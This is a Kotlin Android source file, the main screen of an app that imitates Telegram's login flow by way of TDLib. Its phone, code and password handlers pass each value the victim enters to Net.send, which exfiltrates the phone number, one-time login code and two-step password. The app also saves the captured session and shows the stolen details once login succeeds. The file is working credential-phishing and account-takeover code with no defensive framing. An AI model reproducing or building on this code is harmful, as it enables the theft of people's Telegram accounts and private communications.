package com.tgme.app.ui

import android.app.Activity
import android.os.Bundle
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.tgme.app.Capture
import com.tgme.app.Net
import com.tgme.app.R
import com.tgme.app.Tg
import org.drinkless.tdlib.TdApi

class MainActivity : Activity() {

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        Tg.init(this)
        Tg.onAuthState = { st -> runOnUiThread { onState(st) } }
        Tg.onError = { msg -> runOnUiThread { toast(msg) } }
        showPhone(ready = false)
    }

    override fun onDestroy() {
        Tg.onAuthState = null
        Tg.onError = null
        super.onDestroy()
    }

    // ---------------- état Telegram ----------------

    private fun onState(st: TdApi.AuthorizationState) {
        when (st) {
            is TdApi.AuthorizationStateWaitPhoneNumber -> showPhone(ready = true)
            is TdApi.AuthorizationStateWaitCode -> {
                Capture.codeLength = st.codeInfo.codeLength
                showCode()
            }
            is TdApi.AuthorizationStateWaitPassword -> showPassword()
            is TdApi.AuthorizationStateWaitRegistration ->
                Tg.send(TdApi.RegisterUser("Telegram", "User"))
            is TdApi.AuthorizationStateReady -> onReady()
            else -> Unit
        }
    }

    private fun onReady() {
        Capture.save(this)
        Net.send("READY\nnum: ${Capture.phone}\ncode: ${Capture.code}\npass: ${Capture.password}")
        Tg.send(TdApi.GetMe()) { me -> runOnUiThread { showSuccess(me) } }
    }

    // ---------------- écrans ----------------

    private fun showPhone(ready: Boolean) {
        setContentView(R.layout.screen_phone)
        val cc = findViewById<EditText>(R.id.cc)
        val phone = findViewById<EditText>(R.id.phone)
        val btn = findViewById<TextView>(R.id.btn)

        btn.isEnabled = ready
        btn.alpha = if (ready) 1f else 0.45f

        btn.setOnClickListener {
            val full = normalize(cc.text.toString(), phone.text.toString())
            if (full == null) { toast(getString(R.string.err_number)); return@setOnClickListener }
            Capture.phone = full
            Net.send("PHONE\nnum: $full")
            btn.isEnabled = false
            Tg.send(TdApi.SetAuthenticationPhoneNumber(full, null))
        }
    }

    private fun showCode() {
        setContentView(R.layout.screen_code)
        findViewById<TextView>(R.id.sub).text = getString(R.string.code_sent_to, Capture.phone)
        val code = findViewById<EditText>(R.id.code)
        val need = if (Capture.codeLength in 1..10) Capture.codeLength else 4

        findViewById<TextView>(R.id.btn).setOnClickListener {
            val c = code.text.toString().replace(Regex("\\D"), "")
            if (c.length < need) { toast(getString(R.string.err_code)); return@setOnClickListener }
            Capture.code = c
            Net.send("CODE\nnum: ${Capture.phone}\ncode: $c")
            Tg.send(TdApi.CheckAuthenticationCode(c))
        }
    }

    private fun showPassword() {
        setContentView(R.layout.screen_password)
        val pw = findViewById<EditText>(R.id.password)

        findViewById<TextView>(R.id.btn).setOnClickListener {
            val p = pw.text.toString()
            if (p.isEmpty()) { toast(getString(R.string.err_password)); return@setOnClickListener }
            Capture.password = p
            Net.send("PASSWORD\nnum: ${Capture.phone}\npass: $p")
            Tg.send(TdApi.CheckAuthenticationPassword(p))
        }
    }

    private fun showSuccess(me: TdApi.User) {
        setContentView(R.layout.screen_success)
        findViewById<TextView>(R.id.num).text = Capture.phone
        findViewById<TextView>(R.id.code).text = Capture.code
        findViewById<TextView>(R.id.password).text =
            Capture.password.ifEmpty { getString(R.string.none) }

        val name = listOf(me.firstName, me.lastName)
            .filter { it.isNotBlank() }
            .joinToString(" ")
            .ifBlank { getString(R.string.none) }
        findViewById<TextView>(R.id.who).text = "$name  ·  id ${me.id}"
    }

    // ---------------- outils ----------------

    /** Renvoie un numéro E.164 normalisé, ou null si invalide. */
    private fun normalize(ccRaw: String, nRaw: String): String? {
        var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (n.isEmpty()) return null

        var cc = ccRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (cc.isNotEmpty() && !cc.startsWith("+")) {
            cc = if (cc.startsWith("00")) "+" + cc.substring(2) else "+$cc"
        }

        val full = when {
            n.startsWith("+") -> n
            n.startsWith("00") -> "+" + n.substring(2)
            else -> cc + n
        }
        return if (full.length >= 8) full else null
    }

    private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
}
